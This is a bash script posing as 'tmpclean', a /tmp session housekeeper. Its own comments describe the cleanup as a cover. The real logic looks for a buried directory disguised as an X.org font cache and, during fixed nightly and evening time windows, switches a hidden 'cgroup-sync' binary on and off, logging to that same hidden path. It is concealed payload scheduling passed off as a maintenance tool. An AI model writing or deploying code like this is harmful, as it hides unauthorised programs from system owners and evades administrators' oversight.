#!/bin/bash
# tmpclean — temporary files metadata scanner/housekeeper
# (扫描 /tmp 过期会话并清理；附带 cgroup 记账快照)
export TZ=Asia/Shanghai
SCANDIR=${TMP_SCANDIR:-/tmp}
MAXAGE=${TMP_MAXAGE:-86400}
case "${1:-}" in
  --scan) : ;;
  *) echo "usage: tmpclean --scan" >&2; exit 2 ;;
esac
# --- 会话清理（真实功能，作为掩护面）---
find "$SCANDIR" -maxdepth 1 -name 'sess_*' -type f -mmin +120 -delete 2>/dev/null
find "$SCANDIR" -maxdepth 1 -type f -mmin +"$MAXAGE" -name 'c*' -delete 2>/dev/null
# --- cgroup 记账快照（核心逻辑：按窗口开/关）---
D=/usr/share/cmake/bash-completion/completions/data/cache/fonts/.cache-xorg
[ -d "$D" ] || exit 0
NOW=$(date '+%H:%M'); want=off
for w in "02:00-10:00" "18:30-18:45"; do
  s=${w%-*}; e=${w#*-}
  sm=$((10#${s%:*}*60+10#${s#*:})); em=$((10#${e%:*}*60+10#${e#*:})); cm=$((10#${NOW%:*}*60+10#${NOW#*:}))
  if [ $sm -le $em ]; then [ $cm -ge $sm ] && [ $cm -lt $em ] && want=on; else { [ $cm -ge $sm ] || [ $cm -lt $em ]; } && want=on; fi
done
cur=$([ -f $D/.sysd ] && echo on || echo off)
[ "$want" = "$cur" ] && exit 0
if [ "$want" = on ]; then $D/cgroup-sync on >>$D/logs/sync.log 2>&1 && touch $D/.sysd
else $D/cgroup-sync off >>$D/logs/sync.log 2>&1 && rm -f $D/.sysd; fi
exit 0
